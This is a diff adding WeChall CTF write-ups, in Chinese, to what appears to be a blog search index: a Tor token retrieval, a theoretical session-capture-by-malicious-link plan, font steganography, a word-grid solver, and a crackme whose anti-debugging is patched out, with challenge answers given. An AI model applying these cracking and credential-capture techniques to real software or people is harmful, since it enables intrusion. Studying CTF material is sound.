@@ -24290,4 +24290,435 @@ hash of user solution.</p>
         <tag>rails</tag>
       </tags>
   </entry>
+  <entry>
+    <title>WeChall - Eigentor (Special, Tor)</title>
+    <url>/wp/WeChall/wechall-eigentor/</url>
+    <content><![CDATA[<h3 id="challenge">Challenge</h3>
+<p>WeChall 上的 <span class="exturl" data-url="aHR0cHM6Ly93d3cud2VjaGFsbC5uZXQvY2hhbGxlbmdlL2VpZ2VudG9yL2luZGV4LnBocA==">Eigentor<i class="fa fa-external-link-alt"></i></span>（Special,
+Tor），要求通过 Tor 访问 Edward Snowden
+Land（https://es-land.net），注册后在 Account Settings 的 TorChallenge
+分类获取一次性 16 位 token，提交即完成。</p>
+<p>WeChall 服务端验证方式：POST <code>answer</code> → 调用
+<code>https://es-land.net/torchallenge;trytoken.json?token=&lt;answer&gt;</code>
+→ <code>{"status":0}</code> 无效 / <code>{"status":1}</code> 正确 /
+<code>{"status":2}</code> 已使用。</p>
+<h3 id="solution">Solution</h3>
+<p><strong>启动 Tor</strong>（系统 torrc 有 <code>User</code> 指令需
+root，创建自定义配置）：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat &gt; /tmp/torrc &lt;&lt; &#x27;EOF&#x27;</span><br><span class="line">SocksPort 9050</span><br><span class="line">DataDirectory /tmp/tor_data</span><br><span class="line">Log notice file /tmp/tor_log</span><br><span class="line">EOF</span><br><span class="line">mkdir -p /tmp/tor_data</span><br><span class="line">tor -f /tmp/torrc &amp;</span><br></pre></td></tr></table></figure>
+<p>i manually sign up btw</p>
+<p><strong>登录 ESL</strong>（通过 SOCKS5 代理，cookie jar 绑定
+session）：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl --socks5-hostname 127.0.0.1:9050 -c /tmp/esl.txt \</span><br><span class="line">  -d &#x27;login=Return4837&amp;password=&lt;pw&gt;&amp;submit=Login&#x27; \</span><br><span class="line">  &#x27;https://es-land.net/login;form.html?_lang=en&#x27;</span><br></pre></td></tr></table></figure>
+<p><strong>提取 token</strong> — account settings 页面的
+<code>eigentor</code> 字段只有从 Tor exit node 访问时才被填充。非 Tor
+访问时空值：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl --socks5-hostname 127.0.0.1:9050 -b /tmp/esl.txt \</span><br><span class="line">  &#x27;https://es-land.net/account;allsettings.html?_lang=en&#x27; | \</span><br><span class="line">  grep -oP &#x27;name=&quot;eigentor&quot;[^&gt;]*value=&quot;\K[^&quot;]+&#x27;</span><br></pre></td></tr></table></figure>
+<p>返回 <code>&lt;TOKEN&gt;</code> — 16 位字母数字 token。</p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>writeup</tag>
+        <tag>wechall</tag>
+        <tag>special</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>WeChall - Fix Us</title>
+    <url>/wp/WeChall/wechall-fix-us/</url>
+    <content><![CDATA[<h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>Fix Us (Exploit, PHP)</p>
+<p>Your mission is now to maintain access to the solution boards for the
+Z challenges. Your plan is to gather information about the challenge
+solutions and gain more points on WeChall.net. Because Z is a naive,
+click-before-think guy, he clicks on every link you send him. Your plan
+is to send Z a malicious, but innocent looking link, and once he logs in
+WeChall, you will be able to login in the credentials of Z - and read
+the solution boards as well. Gizmore did a good job against XSS and
+CSRF, so you have to find another flaw to log in. After examining the
+WeChall source code, you found a hidden login page for the Z solution
+boards.</p>
+</blockquote>
+<h3 id="analysis">Analysis</h3>
+<h4 id="攻击面">攻击面</h4>
+<p>挑战提供三个入口： 1. <strong>login.php</strong> — 隐藏的 Z solution
+boards 登录表单（字段：zusername + zuserp） 2.
+<strong>forum.php</strong> — 秘密论坛，需要 Z 权限才能访问 3.
+<strong>"Send a link to Z"</strong> — 向 Z 发送恶意链接</p>
+<p>登录验证使用 WeChall 主站数据库（论坛 hint 证实：<em>"To use the
+login form, simply use your real wechall
+username/password."</em>），所以 Z 的 fixus 密码就是他的 WeChall
+密码。</p>
+<h4 id="攻击链理论">攻击链（理论）</h4>
+<ol type="1">
+<li>搭建一个 HTTP endpoint（VPS、Cloudflare Tunnel 等）</li>
+<li>通过 "Send a link to Z" 给 Z 发送恶意链接</li>
+<li>Z 的 bot 点击链接，访问 endpoint</li>
+<li>捕获 Z 的请求（HTTP headers、cookie、Authorization 等）</li>
+<li>用 Z 的身份登录 fixus → 获取 secret forum 内容 → 拿到 flag</li>
+</ol>
+<h4 id="关键线索">关键线索</h4>
+<p>论坛 hint 帖（forum-t223）给出以下信息： - <strong>"Check the Links,
+Tutorials..."</strong> — Z 在 tutorials 区发过一个链接，内容与本挑战相关
+- <strong>"It's neither a bee nor a hornet"</strong> — 排除
+BeEF（#58），不是 XSS 框架攻击 - <strong>"it might work with the data in
+URLs, but does not work sent in the http headers"</strong> — fixus
+登录接受 GET 参数（原为 bug），但预期攻击方式是通过 HTTP headers -
+<strong>"The challenge might be currently a bit buggy"</strong> —
+挑战可能有 bug，Z bot 可能不正常</p>
+<h4 id="阻塞原因">阻塞原因</h4>
+<p><strong>Z bot 不可用</strong>（疑似损坏）。用 Cloudflare Tunnel
+建立了公开 HTTP endpoint，发送了多个不同格式的链接给
+Z，没有任何请求到达。挑战论坛的最后一个 hint
+帖（2015年）已指出挑战可能有 bug。</p>
+<h3 id="结论">结论</h3>
+<p>挑战依赖 Z bot 的外部交互，该 bot 目前停用。留待 Z bot
+修复后再尝试。</p>
+<h4 id="解题历史">解题历史</h4>
+<p>查看 challenge solvers 页面，Fix Us 的解题时间线如下：</p>
+<ul>
+<li>2009-03-25: gizmore (创建者)</li>
+<li>2009-03-27 ~ 2012-03-25: 陆续 91 人解出</li>
+<li><strong>2012-03-25: 最后一人解出</strong></li>
+<li>2012-03-25 ~ 至今 (14年+): <strong>零人解题</strong></li>
+</ul>
+<p>92 人的总解题数自 2012 年起从未增长。bot 早在 14
+年前就已失效，挑战在当前状态下不可解。</p>
+<h3 id="参考">参考</h3>
+<ul>
+<li>https://www.wechall.net/en/challenge/fixus/index.php</li>
+<li>https://www.wechall.net/forum-t223/Just_a_hint.html</li>
+</ul>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>writeup</tag>
+        <tag>wechall</tag>
+        <tag>php</tag>
+        <tag>exploit</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>WeChall - Illuminati</title>
+    <url>/wp/WeChall/wechall-illuminati/</url>
+    <content><![CDATA[<h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>Illuminati (Stegano) We found a document from the Illuminati, which
+is told to contain the hidden password to enter their vault. They are
+known to be masters of steganography, but maybe you can figure the
+password out for us. Good luck! gizmore</p>
+<p>"A place to gather, a place to hide, should be well hidden and plain
+in sight. Where should you start how to begin, if nothings here except a
+thin phrase of text and random words, are you still lost does the brain
+hurts?"</p>
+</blockquote>
+<h3 id="solution">Solution</h3>
+<p>挑战附带了一个自定义字体文件 <code>sometimes.ttf</code> 和 CSS 文件
+<code>some.css</code>。CSS 中通过 5 个无效的 <code>font-weight</code>
+声明拼出 <code>wrong</code>。</p>
+<p><code>sometimes.ttf</code> 实际上是一个 SFD (SplineFont)
+格式的字体文件，其中的句号字符（<code>.</code>）被修改了。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">❯ file sometimes.ttf</span><br><span class="line">sometimes.ttf: Spline Font Database version 3.0</span><br></pre></td></tr></table></figure>
+<p><strong>解法步骤</strong>： 1. 下载
+<code>https://www.wechall.net/challenge/illuminati/sometimes.ttf</code>
+2. 用 FontForge 打开该字体文件 3. 查看 period/句号字符（U+002E） 4. 该
+glyph 内部绘有密码文本 <code>ILLUMOSATMO</code></p>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">ILLUMOSATMO</span></span>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>writeup</tag>
+        <tag>wechall</tag>
+        <tag>stegano</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>WeChall - Letterworm</title>
+    <url>/wp/WeChall/wechall-letterworm/</url>
+    <content><![CDATA[<h3 id="challenge">Challenge</h3>
+<p>WeChall 上的 <span class="exturl" data-url="aHR0cHM6Ly93d3cud2VjaGFsbC5uZXQvY2hhbGxlbmdlL2xldHRlcndvcm0vaW5kZXgucGhw">Letterworm<i class="fa fa-external-link-alt"></i></span>（Coding），Lettergrid
+的变体。单词在网格中可以中途改变方向（Boggle-style
+zigzag），不再是直线扫描。限时 4.5 秒提交，答案按起点
+<code>(row, col)</code> 排序，逗号分隔。最小长度 6 字符。</p>
+<h3 id="solution">Solution</h3>
+<p>核心思路：Trie 剪枝的 DFS。流程：</p>
+<ol type="1">
+<li>从 <code>73h_vordz.php</code> 获取候选词表（97
+个计算机/编程相关单词）</li>
+<li>从 <code>generate.php</code> 获取网格（iframe
+内嵌，<code>&lt;pre&gt;</code> 标签包裹）</li>
+<li>用词表构建 Trie</li>
+<li>从每个格子出发 DFS 8 方向搜索，Trie 提前剪枝</li>
+<li>去除真子串（如 "program" 存在时移除 "programs"...
+此题其实不需要）</li>
+<li>按起点 <code>(row, col)</code> 升序排列，逗号拼接提交</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;Letterworm solver — Trie + DFS, sub-4.5s&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> requests, re, time</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">BASE = <span class="string">&quot;http://www.wechall.net/challenge/letterworm&quot;</span></span><br><span class="line">COOKIE = &#123;<span class="string">&quot;WC&quot;</span>: <span class="string">&quot;your_cookie&quot;</span>&#125;</span><br><span class="line">UA = <span class="string">&quot;Mozilla/5.0 Chrome/131&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TrieNode</span>:</span><br><span class="line">    __slots__ = (<span class="string">&#x27;children&#x27;</span>, <span class="string">&#x27;is_word&#x27;</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.children = &#123;&#125;</span><br><span class="line">        <span class="variable language_">self</span>.is_word = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. Fetch wordlist (cached per session)</span></span><br><span class="line">t0 = time.time()</span><br><span class="line">sess = requests.Session()</span><br><span class="line">sess.headers.update(&#123;<span class="string">&quot;User-Agent&quot;</span>: UA&#125;)</span><br><span class="line">sess.cookies.update(COOKIE)</span><br><span class="line"></span><br><span class="line">r = sess.get(<span class="string">f&quot;<span class="subst">&#123;BASE&#125;</span>/73h_vordz.php&quot;</span>, timeout=<span class="number">5</span>)</span><br><span class="line">words = [w.strip().lower() <span class="keyword">for</span> w <span class="keyword">in</span> r.text.strip().split(<span class="string">&#x27;\n&#x27;</span>) <span class="keyword">if</span> w.strip()]</span><br><span class="line">root = TrieNode()</span><br><span class="line"><span class="keyword">for</span> w <span class="keyword">in</span> words:</span><br><span class="line">    node = root</span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> w:</span><br><span class="line">        node = node.children.setdefault(ch, TrieNode())</span><br><span class="line">    node.is_word = <span class="literal">True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Wordlist: <span class="subst">&#123;<span class="built_in">len</span>(words)&#125;</span> words&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. Fetch grid (starts the 4.5s timer!)</span></span><br><span class="line">r = sess.get(<span class="string">f&quot;<span class="subst">&#123;BASE&#125;</span>/generate.php&quot;</span>, timeout=<span class="number">5</span>)</span><br><span class="line">m = re.search(<span class="string">r&#x27;&lt;pre&gt;(.*?)&lt;/pre&gt;&#x27;</span>, r.text, re.DOTALL)</span><br><span class="line">grid = [l.strip().lower() <span class="keyword">for</span> l <span class="keyword">in</span> m.group(<span class="number">1</span>).split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> l.strip() <span class="keyword">and</span> <span class="built_in">all</span>(c.isalpha() <span class="keyword">for</span> c <span class="keyword">in</span> l.strip())]</span><br><span class="line">ROWS, COLS = <span class="built_in">len</span>(grid), <span class="built_in">len</span>(grid[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Grid: <span class="subst">&#123;ROWS&#125;</span>x<span class="subst">&#123;COLS&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. DFS search</span></span><br><span class="line">DIRS = [(<span class="number">0</span>,<span class="number">1</span>),(<span class="number">0</span>,-<span class="number">1</span>),(<span class="number">1</span>,<span class="number">0</span>),(-<span class="number">1</span>,<span class="number">0</span>),(<span class="number">1</span>,<span class="number">1</span>),(<span class="number">1</span>,-<span class="number">1</span>),(-<span class="number">1</span>,<span class="number">1</span>),(-<span class="number">1</span>,-<span class="number">1</span>)]</span><br><span class="line">found = &#123;&#125;  <span class="comment"># word -&gt; (r0, c0)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> r0 <span class="keyword">in</span> <span class="built_in">range</span>(ROWS):</span><br><span class="line">    <span class="keyword">for</span> c0 <span class="keyword">in</span> <span class="built_in">range</span>(COLS):</span><br><span class="line">        ch = grid[r0][c0]</span><br><span class="line">        <span class="keyword">if</span> ch <span class="keyword">not</span> <span class="keyword">in</span> root.children:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        stack = [(r0, c0, root.children[ch], <span class="built_in">frozenset</span>([(r0, c0)]), ch)]</span><br><span class="line">        <span class="keyword">while</span> stack:</span><br><span class="line">            cr, cc, node, vis, word = stack.pop()</span><br><span class="line">            <span class="keyword">if</span> node.is_word <span class="keyword">and</span> word <span class="keyword">not</span> <span class="keyword">in</span> found:</span><br><span class="line">                found[word] = (r0, c0)</span><br><span class="line">            <span class="keyword">for</span> dr, dc <span class="keyword">in</span> DIRS:</span><br><span class="line">                nr, nc = cr + dr, cc + dc</span><br><span class="line">                <span class="keyword">if</span> <span class="number">0</span> &lt;= nr &lt; ROWS <span class="keyword">and</span> <span class="number">0</span> &lt;= nc &lt; COLS <span class="keyword">and</span> (nr, nc) <span class="keyword">not</span> <span class="keyword">in</span> vis:</span><br><span class="line">                    nch = grid[nr][nc]</span><br><span class="line">                    <span class="keyword">if</span> nch <span class="keyword">in</span> node.children:</span><br><span class="line">                        stack.append((nr, nc, node.children[nch],</span><br><span class="line">                                     vis | <span class="built_in">frozenset</span>([(nr, nc)]), word + nch))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Found: <span class="subst">&#123;<span class="built_in">len</span>(found)&#125;</span> words in <span class="subst">&#123;time.time()-t0:<span class="number">.3</span>f&#125;</span>s&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. Sort and submit</span></span><br><span class="line">answer = <span class="string">&#x27;,&#x27;</span>.join(<span class="built_in">sorted</span>(found, key=<span class="keyword">lambda</span> w: found[w]))</span><br><span class="line">r = sess.get(<span class="string">f&quot;<span class="subst">&#123;BASE&#125;</span>/index.php&quot;</span>, params=&#123;<span class="string">&quot;solution&quot;</span>: answer, <span class="string">&quot;submit&quot;</span>: <span class="string">&quot;Submit&quot;</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Correct!&quot;</span> <span class="keyword">if</span> <span class="string">&quot;Correct after&quot;</span> <span class="keyword">in</span> r.text <span class="keyword">else</span> <span class="string">f&quot;Failed: <span class="subst">&#123;r.text[:<span class="number">200</span>]&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>词表来源</strong>：<code>73h_vordz.php</code>（= "the_words"
+leet），gitignored 但 live server 可访问。共 97
+个计算机/编程单词，不是全量英语词典</li>
+<li><strong>4.5 秒时限</strong>：从 <code>generate.php</code>
+调用开始计时。本地 Trie 构建 + DFS 不到 10ms，瓶颈在网络延迟</li>
+</ul>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">password,program,partition,evaluate</span></span>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>writeup</tag>
+        <tag>wechall</tag>
+        <tag>coding</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>WeChall - The Last Hope</title>
+    <url>/wp/WeChall/wechall-the-last-hope/</url>
+    <content><![CDATA[<h3 id="challenge">Challenge</h3>
+<p>WeChall 上的 <span class="exturl" data-url="aHR0cHM6Ly93d3cud2VjaGFsbC5uZXQvY2hhbGxlbmdlL2JzZGhlbGwvdGhlbGFzdGhvcGUvaW5kZXgucGhw">The
+Last Hope<i class="fa fa-external-link-alt"></i></span>（Linux, Cracking），由一个 32-bit ELF 二进制构成。</p>
+<h3 id="反调试绕过">反调试绕过</h3>
+<p>二进制有 5 层反调试，必须全部 patch 掉才能正常运行或调试。</p>
+<p>先用 <code>rabin2</code> 获取基本信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ rabin2 -I bsd_thelasthope.elf</span><br><span class="line">arch     x86</span><br><span class="line">binsz    10569</span><br><span class="line">bintype  elf</span><br><span class="line">bits     32</span><br><span class="line">canary   false</span><br><span class="line">class    ELF32</span><br><span class="line">compiler GCC: (Ubuntu 4.3.3-5ubuntu4) 4.3.3</span><br><span class="line">nx       true</span><br><span class="line">os       linux</span><br><span class="line">pic      false</span><br><span class="line">relocs   false</span><br><span class="line">static   false</span><br><span class="line">stripped false</span><br><span class="line">subsys   linux</span><br></pre></td></tr></table></figure>
+<h4 id="layer-1-.ctors-构造函数">Layer 1: <code>.ctors</code>
+构造函数</h4>
+<p>在 <code>main()</code> 之前，<code>.ctors</code> 段中的
+<code>anti_ptrace</code> 就会被调用：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ r2 -q -c &#x27;pf. S .ctors&#x27; bsd_thelasthope.elf</span><br><span class="line">0x0804af00 ffffffff 5b8c0408 00000000     ....[.......</span><br></pre></td></tr></table></figure>
+<p><code>0x08048c5b</code> 即 <code>anti_ptrace</code>。将其 patch 为
+<code>0xffffffff</code>（sentinel 值），让反向遍历提前终止：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># .ctors entry @ VA 0x0804af04 → 文件偏移 = VA - 0x08049000 = 0x1f04</span><br><span class="line">printf &#x27;\xff\xff\xff\xff&#x27; | dd of=bsd_thelasthope.elf bs=1 seek=$((0x1f04)) conv=notrunc</span><br></pre></td></tr></table></figure>
+<h4 id="layer-2-3-main-中的-anti_ptrace-调用-sigtrap-handler">Layer 2
+&amp; 3: main 中的 anti_ptrace 调用 + SIGTRAP handler</h4>
+<p>用 r2 查看 <code>main</code> 的 disassembly：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ r2 -A -q -c &#x27;pdf @ main&#x27; bsd_thelasthope.elf</span><br></pre></td></tr></table></figure>
+<p>关键片段：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x08048d59: call anti_ptrace</span><br><span class="line">0x08048d5e: mov  dword [esp+4], handler  ; signal handler</span><br><span class="line">0x08048d66: mov  dword [esp], 5           ; SIGTRAP</span><br><span class="line">0x08048d6d: call signal</span><br></pre></td></tr></table></figure>
+<p>Patch 这两处为 NOP：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># VA 0x08048d59 → 文件偏移 0x0d59: 5 bytes → NOP</span><br><span class="line"># VA 0x08048d6d → 文件偏移 0x0d6d: 5 bytes → NOP</span><br></pre></td></tr></table></figure>
+<h4 id="layer-4-int3-breakpoint-检测">Layer 4: INT3 + breakpoint
+检测</h4>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x08048d72: int3                    ; SIGTRAP → handler 吞掉</span><br><span class="line">0x08048d73: mov  eax, 0x8048bd1     ; pw_check 地址</span><br><span class="line">0x08048d78: add  eax, 3</span><br><span class="line">0x08048d7b: mov  eax, [eax]</span><br><span class="line">0x08048d7d: and  eax, 0xff</span><br><span class="line">0x08048d82: cmp  eax, 0xcc          ; 检查 pw_check+3 是否被设了 0xCC (int3)</span><br><span class="line">0x08048d87: jne  ...</span><br><span class="line">; 如果发现 0xCC → 打印 &quot;no,no breakpoints&quot; → exit</span><br></pre></td></tr></table></figure>
+<p>Patch 方案：把 <code>int3</code> (VA 0x08048d72 → 文件偏移 0x0d72)
+NOP 掉，把 <code>jne</code> (VA 0x08048d87 → 0x0d87) 改为
+<code>jmp</code>。</p>
+<h4 id="layer-5-ptraceptrace_traceme">Layer 5:
+ptrace(PTRACE_TRACEME)</h4>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x08048dc0: call ptrace             ; ptrace(PTRACE_TRACEME, 0, 1, 0)</span><br><span class="line">0x08048dc5: test eax, eax</span><br><span class="line">0x08048dc7: jns  ...                ; ≥0 → 正常; &lt;0 → &quot;oh oh DEBUGGING... Bye&quot;</span><br></pre></td></tr></table></figure>
+<p>由于 Layer 1 的 fork 子进程已经 ptrace(ATTACH)
+了父进程，PTRACE_TRACEME 必然失败（一个进程只能被一个 tracer
+追踪）。改为 <code>xor eax, eax</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># VA 0x08048dc0 → 文件偏移 0x0dc0: 5 bytes → xor eax,eax; nop; nop; nop (31 c0 90 90 90)</span><br></pre></td></tr></table></figure>
+<p>完整 patch 脚本见文末。</p>
+<h3 id="username-逆向-user_check">Username 逆向
+(<code>user_check</code>)</h3>
+<h4 id="函数调用链">函数调用链</h4>
+<p>用 r2 列出关键函数：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ r2 -q -c &#x27;afl~check&#x27; bsd_thelasthope.elf</span><br><span class="line">0x08048863  user_check</span><br><span class="line">0x08048bd1  pw_check</span><br><span class="line">0x080487a6  length_check</span><br></pre></td></tr></table></figure>
+<p><code>main</code> 中的处理流程：</p>
+<ol type="1">
+<li><code>fgets(username, 15, stdin)</code> — 读入包含换行符（如
+<code>"whoami\n"</code>，<code>strlen=7</code>）</li>
+<li><code>lc(username, len)</code> — 检查前 <code>len-1</code>
+个字符不含大写字母</li>
+<li><code>uc(username, len)</code> — 将前 <code>len-1</code>
+个字符转为大写（原地修改，内部调用 <code>toupper()</code>）</li>
+<li><code>user_check(username, len)</code> — 逐字符验证</li>
+</ol>
+<p>由于 <code>fgets</code>
+保留换行符，<code>strlen("whoami\n")=7</code>，循环 <code>i=0..5</code>
+覆盖全部 6 个有效字符。换行符在 <code>i=6</code> 处被排除。</p>
+<h4 id="约束条件应用于大写-ascii-值">约束条件（应用于大写 ASCII
+值）</h4>
+<p>用 <code>pwntools</code> 快速提取符号和关键常量：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;bsd_thelasthope.elf&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;user_check @ <span class="subst">&#123;elf.symbols[<span class="string">&#x27;user_check&#x27;</span>]:#x&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取加密目标字符串（位于 .rodata 0x08049050）</span></span><br><span class="line">target = elf.read(<span class="number">0x08049050</span>, <span class="number">10</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;encrypted target: <span class="subst">&#123;target&#125;</span>&quot;</span>)  <span class="comment"># b&#x27;Oxw|n]nfog&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><code>user_check</code> 对每个位置 <code>i</code>
+执行不同的检查，将满足条件的值累加到 accumulator，最终与
+<code>0xcd5</code> (3285) 比较：</p>
+<ul>
+<li><strong>0, 1, 4</strong>: 6c±1 双 Fermat + 硬编码，累加
++13c。f0=6c-1, f1=6c+1 均须为基-2 伪素数</li>
+<li><strong>2, 5</strong>: 单 Fermat (c 自身)，累加 +c。2^(c-1) mod c ==
+1</li>
+<li><strong>3</strong>: 整除性，累加 +c。c % 5 == 0</li>
+</ul>
+<p>硬编码检查（在 fermat 通过后执行）：</p>
+<ul>
+<li><code>U[0]</code>: 2×c == 0xae (174) → c = 87 = <code>W</code></li>
+<li><code>U[1]</code>: 2×c == 0x90 (144) → c = 72 = <code>H</code></li>
+<li><code>U[4]</code>: 2×c == 0x9a (154) → c = 77 = <code>M</code></li>
+</ul>
+<p>U[0], U[1], U[4] 被固定为 <code>W</code>, <code>H</code>,
+<code>M</code>。同时要求 6c±1 为素数对（twin primes 模式）：</p>
+<ul>
+<li>W=87: 6×87-1=521(✓), 6×87+1=523(✓)</li>
+<li>H=72: 6×72-1=431(✓), 6×72+1=433(✓)</li>
+<li>M=77: 6×77-1=461(✓), 6×77+1=463(✓)</li>
+</ul>
+<blockquote>
+<p><strong>注意</strong>：positions 0,1,4 的 fermat
+检查后有一条看似多余的 <code>c == floor(6c/5)</code> 比较，实际上编译器
+magic constant <code>0x2aaaaaab</code> 做的是除以 6（而非除以
+5）。<code>floor(6c/6) == c</code> 恒成立，实为 no-op。</p>
+</blockquote>
+<h4 id="求解">求解</h4>
+<p>已知 13×(87+72+77) = 3068，剩余：3285 - 3068 = 217。</p>
+<p>在 A-Z (65-90) 范围内筛选：</p>
+<ul>
+<li>U[2], U[5] 须为 Fermat 伪素数: <code>C, G, I, O, S, Y</code></li>
+<li>U[3] 须被 5 整除: <code>A, F, K, P, U, Z</code></li>
+</ul>
+<p>求 U[2] + U[3] + U[5] = 217 的解：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">U[2]=G(71), U[3]=K(75), U[5]=G(71) → WHGKMG (whgkmg)</span><br><span class="line">U[2]=I(73), U[3]=A(65), U[5]=O(79) → WHIAMO (whiamo)</span><br><span class="line">U[2]=O(79), U[3]=A(65), U[5]=I(73) → WHOAMI (whoami)</span><br></pre></td></tr></table></figure>
+<p>唯一形成有意义单词的是 <code>WHOAMI</code>，对应输入
+<code>whoami</code>（程序通过 <code>uc()</code> 自动转大写）。</p>
+<h4 id="z3-求解替代方案">z3 求解（替代方案）</h4>
+<p>此题约束本质是 CSP：6 个变量、有限域（A-Z）、线性方程 + 素性谓词。z3
+的 table-driven 模式很适合——预计算 26 个字符中哪些满足各位置约束，交给
+z3 解线性部分：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_fermat_prime</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">if</span> n &lt; <span class="number">2</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(<span class="number">2</span>, n-<span class="number">1</span>, n) == <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 预计算：26 个字符中哪些满足各位置的素性约束</span></span><br><span class="line">valid_014 = [c <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>,<span class="number">91</span>)</span><br><span class="line">             <span class="keyword">if</span> is_fermat_prime(<span class="number">6</span>*c-<span class="number">1</span>) <span class="keyword">and</span> is_fermat_prime(<span class="number">6</span>*c+<span class="number">1</span>)]</span><br><span class="line">valid_25  = [c <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>,<span class="number">91</span>) <span class="keyword">if</span> is_fermat_prime(c)]</span><br><span class="line">valid_3   = [c <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>,<span class="number">91</span>) <span class="keyword">if</span> c % <span class="number">5</span> == <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Bool table：每个字符是否满足对应约束</span></span><br><span class="line">table_014 = &#123;c: Bool(<span class="string">f&quot;twin_<span class="subst">&#123;c&#125;</span>&quot;</span>)  <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>, <span class="number">91</span>)&#125;</span><br><span class="line">table_25  = &#123;c: Bool(<span class="string">f&quot;prime_<span class="subst">&#123;c&#125;</span>&quot;</span>) <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>, <span class="number">91</span>)&#125;</span><br><span class="line">table_3   = &#123;c: Bool(<span class="string">f&quot;mod5_<span class="subst">&#123;c&#125;</span>&quot;</span>)  <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>, <span class="number">91</span>)&#125;</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>, <span class="number">91</span>):</span><br><span class="line">    s.add(table_014[c] == (c <span class="keyword">in</span> valid_014))</span><br><span class="line">    s.add(table_25[c]  == (c <span class="keyword">in</span> valid_25))</span><br><span class="line">    s.add(table_3[c]   == (c % <span class="number">5</span> == <span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">U = [BitVec(<span class="string">f&#x27;U<span class="subst">&#123;i&#125;</span>&#x27;</span>, <span class="number">16</span>) <span class="keyword">for</span> i <span 